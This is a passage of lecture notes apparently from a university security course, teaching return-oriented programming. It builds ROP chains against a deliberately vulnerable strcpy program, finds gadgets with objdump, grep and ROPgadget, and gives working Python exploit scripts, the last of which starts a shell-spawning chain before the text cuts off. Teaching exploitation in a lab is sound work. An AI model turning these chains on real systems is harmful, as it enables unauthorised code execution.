  vuln(argv[1]);
}
```

Now, the construction of the /bin/sh string is in two parts, and one of
the functions requires *two* arguments. Looks like our luck ran out and
this is impossible, but just in case, let's try looking at the stack
anyway.

Starting with the first function add<sub>bin</sub> and it's two
arguments which should be followed by `add_sh`, we'd need something like
this:

``` example
|      0x0badf00d      |
|      0xcafebade      |
|      <addr add_sh>   |
|     <addr add_bin>   |
```

That's possible, but then what happens: we've reached an impasse.
add<sub>sh</sub>() takes one argument and the way the stack is alligned,
that argument is 0x0badf00d. That's just not what we need --- we need
0xdeadbeef.

It would seem like this is impossible, but think about what we could do
if we were able to clear the stack. Suppose we had a gadget or little
function that only did pop;pop;ret then we could jump there instead of
add<sub>sh</sub>() and clear out the stack before the next return.
Something like the following:

``` example
|     <addr pwn>         |
|     0xdeadbeef         |
|     <addr bad>         |
|     <addr add_sh>      |
|     0x0badf00d         |
|     0xcafebabe         |
|     <addr pop;pop;ret> |
|     <addr add_bin>     |
```

If you follow the function chain, after ad<sub>bin</sub>() is called
with arguments 0xcafebade and 0x0badf00d, the next function to run is a
gadget that pops 0xcafebabe and 0x0badf00d off the stack. When the
gadget returns, the next address on the stack is add<sub>sh</sub>() with
the argument 0xdeadbeef. The return address of add<sub>sh</sub>() is
bad(), and thus the exploit completes.

# ROP Gadgets

We've been doing a bit of return oriented programming already, but now
we really get into it. The big idea was to chain a bunch of functions
together through their return address to complete a task. That is a form
of return oriented programming, but now we need something different. We
need a very specific kind of an expression, a `pop;popl;ret` which is
not a typical function that we can write. How do we find such a thing?

The answer lies in the code itself. While we as programmers of C will
never explicitly write a function that is just `pop;pop;ret`, the C
compiler will most certainly compile instructions that contain that
sequence of instructions. We describe that sequence as a *gadget*
because it unintentionally gives us the functionality we need, and it
ends in a return statement so it can be chained with other function
calls.

## Hunting a Gadget

The key now is to hunt down the gadget we need. For that, we can use
objdump and grep. For reference the -A option with grep prints the
specified number of lines *after* a match, and the -B option with grep
prints the specified number of lines *before* a match.

``` example
user@si485H-base:demo$ objdump -d -M intel call_bad_doublechain | grep -B 3  ret | grep -A 3 pop  
 8048335:   5b                      pop    ebx
 8048336:   c3                      ret    
--

--
 8048508:   5f                      pop    edi
 8048509:   5d                      pop    ebp
 804850a:   c3                      ret    
--
 8048556:   83 c4 14                add    esp,0x14
 8048559:   5f                      pop    edi
 804855a:   5d                      pop    ebp
 804855b:   c3                      ret    
--
 8048571:   89 04 24                mov    DWORD PTR [esp],eax
--
 804862d:   5e                      pop    esi
 804862e:   5f                      pop    edi
 804862f:   5d                      pop    ebp
 8048630:   c3                      ret    
--
 804863f:   90                      nop
--
 8048656:   5b                      pop    ebx
 8048657:   c3                      ret    
```

The search terms above looked for any return statement, printing the 3
previous lines. Then the following grep searched for a pop statement,
printing the 3 lines after. The result, above, shows us where there is
instance of a `pop;pop;ret;`, at address 0x08048508. What is also
important with this gadget is that we don't care to where the data is
being popped, to any of the registers is fine, as long as it is being
popped off the stack.

## Using the gadget

With this information in place, we can complete the exploit by first
identifying the other important address and lining up our stack like
below:

``` example
|     <addr pwn>         |
|     0xdeadbeef         |
|     <addr bad>         |
|     <addr add_sh>      |
|     0x0badf00d         |
|     0xcafebabe         |
|     <addr pop;pop;ret> |
|     <addr add_bin>     |
```

We can use gdb to find the other addresses:

``` example
user@si485H-base:demo$ gdb -q call_bad_doublechain
Reading symbols from call_bad_doublechain...done.
(gdb) x/x add_bin
0x80484ad <add_bin>:    0x57e58955
(gdb) x/x add_sh
0x804850b <add_sh>: 0x57e58955
(gdb) x/x bad
0x804855c <bad>:    0x83e58955
(gdb) x/x pwn
0x804a060 <pwn>:    0x00000000
(gdb) quit

user@si485H-base:demo$ ./call_bad_doublechain `python -c "s='A'*(0x6c+4); 
s+='\xad\x84\x04\x08'; 
s+='\x08\x85\x04\x08'; 
s+='\xbe\xba\xfe\xca';
s+='\x0d\xf0\xad\x0b';
s+='\x0b\x85\x04\x08';
s+='\x5c\x85\x04\x08';
s+='\xef\xbe\xad\xde';
s+='\x60\xa0\x04\x08';
print s; "`
?uf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????

 \ﾭ?`?
add_bin: pwn: /bin
add_sh: pwn: /bin/sh
You've been PWNED!
$ 
```

## Where do we go from here?

In this example, we used a gadget within the code that did a simple task
of chaining functions with different numbers of arguments. What if we
were to do something more interesting? What if we were able to find
enough gadgets to build a complete exploit? That idea is called ROP
exploits, and believe it or not, you can do a *complete* exploit with
shell code using *only* small gadgets. And, yes, it is as awesome as it
sounds!

# ROP Chains

The concepts of Return Oriented Programming are really powerful.
Previously, we saw where we can use a gadget to manipulate the stack so
that we can chain functions together with different numbers of
arguments. This time, we are going to try and write full exploits using
only gadgets.

The difference in these procedures is that we are now going to leverage
a quirk of x86. It is a variable length instruction set, which means
that not all instructions fit within a set boundary. There are
advantages to this with respect to performance of the CPU, e.g., the CPU
can load multiple instructions with a single load call if the
instructions are short enough, but this also means that embedded within
natural code there is a hidden code if things get slightly out of align.
Think about it: What is an instruction anyway other than just some
bytes? It doesn't really matter where we find those bytes as long as
they do what we need. The key is finding all the gadgets we need to get
the job done and then chaining those gadgets together.

## The goal for our ROP chain

The basic concept of ROP chaining is that a gadget is a small set of
instructions, one or two, followed by a return. If we were to write the
address of these instructions on the stack overwriting the return
address, we can then chain a whole bunch together just like we did
before. Each gadget does a simple tasks, but many of them could result
in an exploit.

To start, we will use the following program that is compiled statically
with glibc to give us a bit more code to play with in a nice predictable
place.

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>

    void vuln(char * s){
      char buf[100];

      strcpy(buf,s);

      printf("Buf: %s\n", buf);
    }

    void main(int argc, char * argv[]){

        vuln(argv[1]);
    }

The goal is to get this program to print 'A' to stdout, if we can do
that, we can do anything. It means we can do arbitrary system calls to
do arbitrary work. To start, let's remember how we would normally print
an 'A' in x86:

``` asm
section .txt
 global _start

_start:
 xor eax,eax

 push eax
 push BYTE 0x41 ; 'A'

 mov ebx,eax ; 
 inc ebx ; 1 for stdout

 mov ecx,esp  ; references 'A'

 mov edx,eax
 inc edx ;length of 'A'. 1

 inc eax
 inc eax
 inc eax
 inc eax ;eax is 4 for sys_write

 int 0x80
```

I've purposely written this to use small instructions so we can more
easily find some gadgets that meet these instructions. Now the challenge
is to find the codes we are interested in, but the crux of the matter is
getting the following registers set up:

``` example

  eax 0x3
  ebx 0x1
  ecx <"A\0">  (address of a null terminate string)
  edx 0x1
  int 0x80
```

If we can get that, then we can write an 'A' to stdout, or any arbitrary
string we choose.

# Building a ROP chain from scratch

The first thing we need to do in order to build a ROP chain is to find
gadgets. First we will look at doing this manually by searching for
gadgets using `objdump` and `grep`. Latter we'll look at doing this in a
more automated fashion.

## Finding Some Useful Gadgets

Let's use objdump and grep to get things started. Recall that the `-A`
option says to print two lines after a match, and the `-B` options says
to print two lines before a match. If we do just a general search, the
first kind of gadgets that apear are all in the pop;pop;ret category.

``` example
user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | head -31
 80481c6:   83 c4 08                add    esp,0x8
 80481c9:   5b                      pop    ebx
 80481ca:   c3                      ret    
--
 804838d:   5f                      pop    edi
 804838e:   5d                      pop    ebp
 804838f:   c3                      ret    
--
 804841e:   5f                      pop    edi
 804841f:   5d                      pop    ebp
 8048420:   c3                      ret    
--
 804846e:   5e                      pop    esi
 804846f:   5f                      pop    edi
 8048470:   c3                      ret    
--
 8048549:   5f                      pop    edi
 804854a:   5d                      pop    ebp
 804854b:   c2 04 00                ret    0x4
--
 8048710:   5f                      pop    edi
 8048711:   5d                      pop    ebp
 8048712:   c3                      ret    
--
 80488d5:   5f                      pop    edi
 80488d6:   5d                      pop    ebp
 80488d7:   c3                      ret    
--
 8048922:   5e                      pop    esi
 8048923:   5f                      pop    edi
 8048924:   c3                      ret    
```

These are all usable gadgets because they allow us to set registers
arbitrarily by popping something off the stack into a register. In
genreal, there are going to be three really useful kinds of gadgets
which we will need to find:

-   pop reg : this will allow us to control the value in a register
    since we control the stack
-   xor reg, reg : zero a register
-   `mov dword ptr [r1], r2` : this will allow us to write to arbitrary
    memory

We already have at least a few of those above. For example, already, we
have found a lot of useful gadgets, such as: `pop esi;pop edi; ret;`.
This will allow us to arbitrarily set the value of edi and esi like
following:

``` example

 |  <next gadget >        |
 |   value for edi        |
 |   value for esi        |
 | <pop esi;pop edi; ret> |
```

## Building a useful chain

Let's look for a bit more useful gadgets:

``` example
objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A 2 -B 1 xor
(...)
--
80b80d5:    5d                      pop    ebp
 80b80d6:   31 c0                   xor    eax,eax
 80b80d8:   c3                      ret   
```

This gadget will zero out eax and set the value of ebx! Or if we just
jump to the xor, simply zero out the value for eax. We also need a
gadget to increment the value in eax:

``` example
user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A 2 -B 1 inc 
(...)
--
 805caec:   40                      inc    eax
 805caed:   5f                      pop    edi
 805caee:   c3                      ret    
```

And we need a gadget to write to memory based on a register, something
like `mov DWORD[edx],eax`

``` example
user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A 2 "DWORD PTR \[edx\],eax"
(...)
 809a70d:   89 02                   mov    DWORD PTR [edx],eax
 809a70f:   c3                      ret    
--
```

Now we have everything we need except a place to write too. For that we
can use any old place in the data segment. Turns out 0x080ea060 is
perfect for that.

## Write an "A\\0" to memory ROP chain

If we can find the *right* gadgets, then writing a ROP chain to just
write "A\\0" to a memory location is actually rather straight forward.
It should look something like this:

``` example
    | <mov [edx],eax;ret> | write '0000' to address 0x080ea61
    | 0x080ea061           | next byte after 0x80ea61
    | <pop edx; ret>      | store next value in edx
    | <xor eax,eax; ret>  | zero eax
    | <mov [edx],eax;ret> | write 'AAAA' to address 0x080ea60
    | 0x41414141          | 'AAAA'
    | <pop eax;ret>       | store next value in eax
 ^  | 0x080ea060           | address we will write to, now stored in edx
 |  | <pop edx; ret>      |  store next value in edx
```

Reading from bottom to top up the stack. First we move the address we
want to write to into edx with a pop, then similarly we move a bunch of
A's into eax. Then we can write to the address edx the A's in eax. Once
we zero out eax and write that to the next byte, we should have the
string "A\\0" at address 0x080ea061.

Let's find the right gadgets. First we need `pop edx;ret`:

``` example
user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 4 ret | grep -A 4 "pop.*edx" 
 806e97a:   5a                      pop    edx
 806e97b:   c3                      ret   
```

Then we need a pop `pop eax; ret`. Unfortunately, finding this is
harder, and unfortunately, the one I found does a bunch of other stuff:

``` example
user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 4 ret | grep -A 4 "pop.*eax" 
 809e08a:   58                      pop    eax
 809e08b:   5b                      pop    ebx
 809e08c:   5e                      pop    esi
 809e08d:   5f                      pop    edi
 809e08e:   c3                      ret    
```

But that's fine, we can handle that. And, we already have the `mov`
command:

``` example
user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A 2 "DWORD PTR \[edx\],eax"
(...)
 809a70d:   89 02                   mov    DWORD PTR [edx],eax
 809a70f:   c3                      ret    
--
```

The last thin we need is `xor` eax command:

``` example
user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 1 ret | grep -A 1 "xor.*eax,eax" 
 8054200:   31 c0                   xor    eax,eax
 8054202:   c3                      ret    
(...)
```

This means we can put together the chain like so:

``` example
0x0809a70d  | <mov [edx],eax;ret> | write '0000' to address 0x080ea61
0x080ea061  | 0x080ea061          | next byte after 0x80ea61
0x0806e97a  | <pop edx; ret>      | store next value in edx
0x08054202  | <xor eax,eax; ret>  | zero eax
0x0809a70d  | <mov [edx],eax;ret> | write 'AAAA' to address 0x080ea60
0xdeadbeef  | 0xdeadbeef          | to be stored in edi
0xdeadbeef  | 0xdeadbeef          | to be stored in esi
0xdeadbeef  | 0xdeadbeef          | to be stored in ebx
0x41414141  | 0x41414141          | 'AAAA' to be stored in eax
0x0809e080  | <pop eax; pop ebx; pop esi; pop edi ret>       | store next value in eax
0x080ea060  | 0x080ea060          | address we will write to, now stored in edx
0x0806e87a  | <pop edx; ret>      |  store next value in edx
```

Notice the `0xdeadbeef`. This is because the gadget to set eax comes
with some added bagage, namely a bunch of extra pop's that have to be
handled. These pop's will clear the stack of values, so we need to add
some values on the stack, 0xdeadbeef's, so we don't interfere with the
rest of the chain.

## Executing the ROP Chain

One problem with ROP chains is that they are long, much longer then
something we can just casually type on the command line. It then makes
sense to store it in a file, and python is the right tool for the job.

``` example
p = 'A'*0x70 #put padding here

p += pack('<I', 0x0806e97a) #pop edx; ret
p += pack('<I', 0x080ea060) #address to write to
p += pack('<I', 0x0809e080) #pop eax;pop ebx; pop esi; pop edi; ret
p += pack('<I', 0x41414141) #'AAAA'
p += pack('<I', 0xdeadbeef) # filler
p += pack('<I', 0xdeadbeef) # filler
p += pack('<I', 0xdeadbeef) # filler
p += pack('<I', 0x0809a70d) # mov [edx],eax;ret
p += pack('<I', 0x08054202) # xor eax,eax
p += pack('<I', 0x0806e97a) #pop edx; ret
p += pack('<I', 0x080ea061) #address to write to
p += pack('<I', 0x0809a70d) # mov [edx],eax;ret
p += pack('<I', 0xcafebabe) #  will segfault here
print p 
```

Note that the `pack('<I',0xdeadbeef)` will create a properly formatted
little Endian string of 0xdeadbeef. Also note that we built the exploit
string in reverse order from the presentation above. I also places a
0xcafebabe in there so we can know if we segfaulted and reached the end
of our ropchain, so let's try it out and see if we get there:

``` example
user@si485H-base:demo$ ./vulnerable `python rop_chain.py`
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAz`??
Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[1551626.753436] vulnerable[10562]: segfault at bf00e080 ip bf00e080 sp bffff618 error 14
```

Hmm. It did not work, why? Well look closely a the `ip` we segfaulted on
0xbf00e080. There is a null byte in there, and also that looks a lot
like the address for our `pop eax; pop ebx; pop esi; pop edi; ret;` at
0x0809e080. The 0x098 did not wite onto the stack, and the reason for
that is 0x09 is '\\t' (tab) and that terminated the `strcpy()`.

It turns out that not all of our gadgets that we find can be used
because the address may contain values we can't include in the overflow.
Looks like we need to hunt for more gadgets!

## Gadgets within Other Operations

One thing we can leverage here is that x86 is not a fixed size
instruction set. Instead, any sequence of bytes could be a valid
instruction. Before, the address of `pop eax` gadget was at an address
that was not useful, but we can look for another one that might be
embeded elsehwere.

To start, it is worthwhile to know that byte 0xc3 is the return
operation and address 0x58 is the `pop eax` instruction. In that case,
we can do a search for that address and find:

``` example
user@si485H-base:demo$ objdump -d -M intel vulnerable  |  grep -B 2 "c3" | grep -A 2 58
(...)
80bb744:    8b 40 58                mov    eax,DWORD PTR [eax+0x58]
80bb747:    c3                      ret    
(...)
```

And there, within that mov instruction, we see that there is a 0x58
followed by a 0xc3. That means we can use address 0x080bb746 in our ROP
chain. Now we can use the following rop chain:

``` example
p += pack('<I', 0x0806e97a) #pop edx; ret
p += pack('<I', 0x080ea060) #address to write to
p += pack('<I', 0x080bb746) #pop eax; ret
p += pack('<I', 0x41414141) #'AAAA'
p += pack('<I', 0x0809a70d) # mov [edx],eax;ret
p += pack('<I', 0x08054202) # xor eax,eax
p += pack('<I', 0x0806e97a) #pop edx; ret
p += pack('<I', 0x080ea061) #address to write to
p += pack('<I', 0x0809a70d) # mov [edx],eax;ret
p += pack('<I', 0xcafebabe) #  will segfault here
```

And if we test it to see if we get to the 0xcafebabe:

``` example
user@si485H-base:demo$ ./vulnerable `python rop_chain.py`
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAz`F?
?                                                                                                                       AAAA
Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[1555336.602578] vulnerable[10650]: segfault at 800a70d ip 0800a70d sp bffff630 error 14 in vulnerable[8048000+a1000]
```

Not again. This time it is 0x09 in the `mov [edx],eax; ret` instruction.
Seems like we need a better way because we can continue to explore for
these embedded gasgets, but thats a lot of work. Thankfully, there are
tools to make this a lot easier.

## Automated Gadget Hunting

Because it's a pain in the ass to find the ROP gadgets by hand, people
have developed automated tools for both finding gadgets and
automatically assembling exploits based on those gadgets. The one we'll
focus on today is
[ROPgadget](https://github.com/JonathanSalwan/ROPgadget). You should
work to install it on your own virtual box system.

While ROPgadget does all sorts of cool things, we'll primarily use it to
find gadgets for us. Here's the most basic usage where I am just
seperating out the pop eax instructions:

``` example
user@si485H-base:demo$ ./ROPgadget.py --binary ./vulnerable | grep ": pop eax "
0x0808f020 : pop eax ; adc al, -0x7b ; sal byte ptr [edx + ecx + 0xffffffc1], cl ; retf
0x080a9926 : pop eax ; adc al, 0x39 ; ret
0x080e01f5 : pop eax ; add byte ptr [eax], al ; mov bh, dl ; clc ; jmp dword ptr [ebx]
0x0806c1b6 : pop eax ; add byte ptr [eax], al ; xor eax, eax ; leave ; ret
0x080e0e1c : pop eax ; add byte ptr fs:[eax], al ; add byte ptr [eax], -7 ; jmp edi
0x08054a15 : pop eax ; and al, -0x77 ; dec eax ; or al, 1 ; retf 0x5089
0x0808cf6d : pop eax ; and bl, ch ; ret -0x4b73
0x0805ae06 : pop eax ; je 0x805ae17 ; add esp, 0x68 ; pop ebx ; ret
0x0809d932 : pop eax ; jmp dword ptr [eax]
0x0809e5b3 : pop eax ; mov dword ptr [esp + 4], eax ; call 0x80ab047
0x0807b5c8 : pop eax ; mov eax, 0x77 ; int 0x80
0x080858e1 : pop eax ; mov eax, edx ; add esp, 0x1c ; ret
0x0805c84c : pop eax ; mov edi, eax ; mov esi, edx ; mov eax, dword ptr [esp + 4] ; ret
0x080539ce : pop eax ; or al, -0x77 ; push eax ; add al, -0x77 ; dec eax ; and al, 0x5b ; ret
0x080573eb : pop eax ; or al, 0x39 ; ret
0x0808b691 : pop eax ; or byte ptr [ebx + 0x89010442], al ; retf -0x1e7d
0x0808c521 : pop eax ; or byte ptr [ecx + 0x20488910], cl ; pop ebx ; ret
0x080e359d : pop eax ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret
0x080e5cff : pop eax ; or cl, byte ptr [esi] ; or al, 0x41 ; ret
0x08058169 : pop eax ; or dh, dh ; ret
0x0804a0cf : pop eax ; or dh, dh ; ret 0xfdf
0x0809e02a : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080e105d : pop eax ; push cs ; adc al, 0x41 ; ret
0x080bb746 : pop eax ; ret  <---
0x08071fba : pop eax ; ret 0x80e
0x080b0914 : pop eax ; retf
0x080554f9 : pop eax ; xor byte ptr [ebx + 0xffffff83], bl ; retf -0x7cfe
```

In the list, indicated with an "\<---", you see the `pop eax;ret` we
found earlier. Now we only need to find `mov [edx],eax` instruction:

``` example
user@si485H-base:demo$ ./ROPgadget.py --binary ./vulnerable | grep ": mov dword ptr \[edx\]"
0x080e62a9 : mov dword ptr [edx], cs ; push cs ; adc al, 0x41 ; ret
0x080e3b65 : mov dword ptr [edx], cs ; push cs ; adc al, 0x43 ; ret
0x080e345b : mov dword ptr [edx], cs ; push cs ; or al, 0x41 ; ret
0x08066fc4 : mov dword ptr [edx], eax ; lea eax, dword ptr [edx + 1] ; pop edi ; ret
0x08067104 : mov dword ptr [edx], eax ; lea eax, dword ptr [edx + 1] ; ret
0x08066ef2 : mov dword ptr [edx], eax ; lea eax, dword ptr [edx + 3] ; pop edi ; ret
0x08067122 : mov dword ptr [edx], eax ; lea eax, dword ptr [edx + 3] ; ret
0x080656a2 : mov dword ptr [edx], eax ; mov eax, edi ; pop edi ; ret
0x08065894 : mov dword ptr [edx], eax ; mov eax, edx ; ret
0x080a713b : mov dword ptr [edx], eax ; mov ebx, dword ptr [ebp + 0xfffffffc] ; leave ; ret
0x0808fc26 : mov dword ptr [edx], eax ; pop ebx ; ret <-- but this one works fine
0x0809a70d : mov dword ptr [edx], eax ; ret  <--- One from before
0x0807457c : mov dword ptr [edx], ecx ; add esp, 0x6c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0805ee34 : mov dword ptr [edx], ecx ; mov eax, dword ptr [esp + 4] ; ret
0x080e4871 : mov dword ptr [edx], ecx ; push cs ; adc al, 0x43 ; ret
0x08054992 : mov dword ptr [edx], ecx ; ret
```

As you can see, we found the previous one from before with the 0x09 tab
in it, but we can also find one that does the same, but with a `pop ebx`
in the middle without a 0x09 in the address. So now we have the
following, where we use 0xdeadbeef to pop into ebx

``` example
p += pack('<I', 0x0806e97a) #pop edx; ret
p += pack('<I', 0x080ea060) #address to write to
p += pack('<I', 0x080bb746) #pop eax; reat;
p += pack('<I', 0x41414141) #'AAAA'
p += pack('<I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
p += pack('<I', 0xdeadbeef) #  filler for pop ebx
p += pack('<I', 0x08054202) # xor eax,eax
p += pack('<I', 0x0806e97a) #pop edx; ret
p += pack('<I', 0x080ea061) #address to write to
p += pack('<I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
p += pack('<I', 0xdeadbeef) #  filler for pop ebx
p += pack('<I', 0xcafebabe) #  will segfault here
```

And if we run this, we see we segfault on cafebabe, hurray!

``` example
user@si485H-base:demo$ ./vulnerable `python rop_chain.py`
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAz`F?
                                                                                                                        AAAAﾭ?zaﾭ޾???
Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[1560517.099344] vulnerable[10793]: segfault at cafebabe ip cafebabe sp bffff64c error 15
```

# Completing the Exploit

Now that you've seen what the game is like, we can finish this exploit
and write an 'A' to stdout. At this point it is only a matter of finding
the right gadgets:

``` example
user@si485H-base:demo$ cat print_A_rop.py
#!/usr/bin/python

from struct import pack

p = '+'*(0x70) #padding

#Write an A to 0x080ea060
p += pack('<I', 0x0806e97a) #pop edx; ret
p += pack('<I', 0x080ea060) #address to write to
p += pack('<I', 0x080bb746) #pop eax; ret
p += pack('<I', 0x41414141) #'AAAA'
p += pack('<I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
p += pack('<I', 0xdeadbeef) #  filler for pop ebx, will be adjust to 0x01 below

#Set eax to 0x4 and ebx to 0x1
p += pack('<I', 0x080584a6) # : xor eax, eax ; pop ebx ; ret
p += pack('<I', 0xffffffff)# set ebx to 0xfffffff
p += pack('<I', 0x080e2593) #: add al, 2 ; inc ebx ; ret (ebx=0xffffffff+1 = 0x00000000)
p += pack('<I', 0x080e2593) #: add al, 2 ; inc ebx ; ret (ebx=0x00000000+1 = 0x00000001)

#Set ecx to 0x080ea060
p += pack('<I', 0x080e4c5d) # pop ecx ; ret
p += pack('<I', 0x080ea060) #address of AAAA


#set edx to 0x1
p += pack('<I', 0x0806e97a)# pop edx ; ret
p += pack('<I', 0xffffffff)# set edx to 0xfffffff
p += pack('<I', 0x0805d0e7)# : inc edx ; ret
p += pack('<I', 0x0805d0e7)# : inc edx ; ret (now edx is 0x1)

#call interupt
p += pack('<I', 0x0806f040) # int 0x80; ret

p += pack('<I', 0xcafebabe) # <-- segfault here

print p 
```

And then we can run it:

``` example
user@si485H-base:demo$ ./vulnerable `python print_A_rop.py`
Buf: ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++z`F?
                                                                                                                        AAAAﾭަ??????]`z??????@????
ASegmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[1564247.938610] vulnerable[11157]: segfault at cafebabe ip cafebabe sp bffff654 error 15
```

And you see, there's our A!

## Printing a Sequence of Chars

Now that we can print an "A", let's try and print something a bit more
exciting, like "Go Navy"\` At this point, we have successfully created
the string we are going to write, the next thing we need is to be able
set up the remainder of the registers or call a function that can print
to the screen.

The cool thing is now that we have the infrastructure, we can just make
functions out of these. That is, we can make a function that produces a
ROP chain that does our task, and then we can just chain those together:

``` python
#!/usr/bin/python

import sys
from struct import pack

#write a char to memory
def write_char(a):
    p = ""
    #Write a to 0x080ea060
    p += pack('<I', 0x0806e97a) #pop edx; ret
    p += pack('<I', 0x080ea060) #address to write to
    p += pack('<I', 0x080bb746) #pop eax; ret
    p += pack('<I', a) # character we want to print
    p += pack('<I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
    p += pack('<I', 0xdeadbeef) #  filler for pop ebx, will be adjust to 0x01 below
    return p

#write a space to memory
def write_space():
    p = ""
    #Write a to 0x080ea060
    p += pack('<I', 0x0806e97a) #pop edx; ret
    p += pack('<I', 0x080ea060) #address to write to
    p += pack('<I', 0x080bb746) #pop eax; ret
    p += pack('<I', 0x1f1f1f1f) # write byte one less than 0x20 for space
    p += pack('<I', 0x0807b466) # inc eax ; ret (turns least significant byte to 0x20)
    p += pack('<I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
    p += pack('<I', 0xdeadbeef) #  filler for pop ebx, will be adjust to 0x01 below
    return p

#write a newline to memory
def write_newline():
    p = ""
    #Write a to 0x080ea060
    p += pack('<I', 0x0806e97a) #pop edx; ret
    p += pack('<I', 0x080ea060) #address to write to
    p += pack('<I', 0x080584a6) # : xor eax, eax ; pop ebx ; ret
    p += pack('<I', 0xdeadbeef) # filler for pop ebx
    p += pack('<I', 0x0807b466) # inc eax 
    p += pack('<I', 0x0807b466) # inc eax 
    p += pack('<I', 0x0807b466) # inc eax 
    p += pack('<I', 0x0807b466) # inc eax 
    p += pack('<I', 0x0807b466) # inc eax 
    p += pack('<I', 0x0807b466) # inc eax 
    p += pack('<I', 0x0807b466) # inc eax 
    p += pack('<I', 0x0807b466) # inc eax 
    p += pack('<I', 0x0807b466) # inc eax 
    p += pack('<I', 0x0807b466) # inc eax 
    p += pack('<I', 0x0808fc26) # mov [edx],eax;pop ebx;ret
    p += pack('<I', 0xdeadbeef) #  filler for pop ebx
    return p


#print the char in memory to the screen
def print_char():
    p = ""
    #Set eax to 0x4 and ebx to 0x1
    p += pack('<I', 0x080584a6) # : xor eax, eax ; pop ebx ; ret
    p += pack('<I', 0xffffffff)# set ebx to 0xfffffff
    p += pack('<I', 0x080e2593) #: add al, 2 ; inc ebx ; ret (ebx=0xffffffff+1 = 0x00000000)
    p += pack('<I', 0x080e2593) #: add al, 2 ; inc ebx ; ret (ebx=0x00000000+1 = 0x00000001)

    #Set ecx to 0x080ea060
    p += pack('<I', 0x080e4c5d) # pop ecx ; ret
    p += pack('<I', 0x080ea060) #address of AAAA


    #set edx to 0x1
    p += pack('<I', 0x0806e97a)# pop edx ; ret
    p += pack('<I', 0xffffffff)# set edx to 0xfffffff
    p += pack('<I', 0x0805d0e7)# : inc edx ; ret
    p += pack('<I', 0x0805d0e7)# : inc edx ; ret (now edx is 0x1)

    #call interupt
    p += pack('<I', 0x0806f040) # int 0x80; ret
    return p


#convert a char to 0xXXXXXXX number
def dub_char(s):
    r = ord(s[0])
    r = r | r << 8 | r << 16 | r << 24
    return r

if __name__ == "__main__":
    p = '+'*(0x70) #padding

    for c in sys.argv[1]:
        if ord(c) == 0x20:
            p += write_space()
        else:
            p += write_char(dub_char(c))

        p += print_char()

    p += write_newline()
    p += print_char()

    p += pack('<I', 0xcafebabe) # <-- segfault here

    print p 
```

And it works:

``` example
user@si485H-base:demo$ ./vulnerable `python print_string_rop.py "Go Navy, Beat Army!"`
Buf: ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++z`F?
                                                                                                                        GGGGﾭަ??????]`z??????@z`F?
                                                                                                                                                ooooﾭަ??????]`z??????@z`F?
                                                                                                                                                                        fﾭަ??????]`z??????@z`F?
                                                                                                                                                                                             NNNNﾭަ??????]??????@z`F?
        aaaaﾭަ??????]`z??????@z`F?
                                vvvvﾭަ??????]`z??????@z`F?
                                                        yyyyﾭަ??????]`z??????@z`F?
                                                                                ,,,,ﾭަ??????]`z??????@z`F?
                                                                                                        fﾭަ??????]`z??????@z`F?
                                                                                                                             BBBBﾭަ??????]`z??????@z`F?
                                                                                                                                                     eeeeﾭަ??????]`z??????@z`F?
                                                                                                                                                                             aaaaﾭަ??????]`z??????@z`F?
                                                                                                                                                                                                     tttﾭަ??????]`z??????@z`F?
                 fﾭަ??????]`z??????@z`F?
                                      AAAAﾭަ??????]`z??????@z`F?
                                                              rrrrﾭަ??????]`z??????@z`F?
                                                                                      mmmmﾭަ??????]`z??????@z`F?
                                                                                                              yyyyﾭަ??????]`z??????@z`F?
                                                                                                                                      !!!!ﾭަ??????]`z??????@z`?ﾭ?ffffffffffﾭަ??????]`z??????@????
Go Navy, Beat Army!
Segmentation fault (core dumped)
user@si485H-base:demo$ dmesg | tail -1
[1565900.040307] vulnerable[11345]: segfault at cafebabe ip cafebabe sp bffff654 error 15
```

## Launching a shell

We actually have everything we need to also launch a shell. It is the
same as writing an 'A' but now we also have to set up the other
registers slightly differently. Recall, this is what we need:

-   eax : 0xb
-   ebx : address of the string "/bin/sh\\0"
-   ecx : 0x0
-   edx : 0x0

We can do that.

``` example
user@si485H-base:demo$ cat shell_rop.py
from struct import pack

p = '+'*(0x70) #padding

#Write an /bin to 0x080ea060
p += pack('<I', 0x0806e97a) #pop edx; ret
p += pack('<I', 0x080ea060) #address to write to
